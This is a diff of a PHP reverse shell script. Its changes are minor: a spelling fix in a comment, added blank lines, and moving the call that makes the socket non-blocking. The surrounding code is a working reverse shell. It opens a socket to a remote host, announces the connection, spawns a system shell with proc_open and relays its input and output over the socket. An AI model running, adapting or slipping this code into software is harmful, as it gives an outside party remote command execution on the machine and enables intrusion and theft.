@@ -11,8 +11,9 @@
 
     // open a socket to connect to host
     $socket = fsockopen($host, $port, $errno, $errstr, $timeout);
-    
-    // check if connection successfull
+
+
+    // check if connection successful
     if (!$socket) 
     {
         exit("UNABLE TO CONNECT TO HOST\n");
@@ -20,6 +21,10 @@
 
     // notify host
     fwrite($socket, "CONNECTION ESTABLISHED\n");
+
+
+    // set socket to non-blocking
+    stream_set_blocking($socket  , FALSE);
 
 
     // file descriptors
@@ -32,6 +37,7 @@
 
     // get a shell
     $process = proc_open($shell, $descriptorspec, $pipes);
+
 
     // make sure we have a shell
     if ( !is_resource($process) )
@@ -46,11 +52,11 @@
 
     // set data streams to non-blocking so they
     // don't wait for data when being read
-    stream_set_blocking($socket  , FALSE);
     stream_set_blocking($pipes[0], FALSE);
     stream_set_blocking($pipes[1], FALSE);
     stream_set_blocking($pipes[2], FALSE);
 
+    
     // now we've got a reverse shell.
     // handle io:
     while (TRUE) 
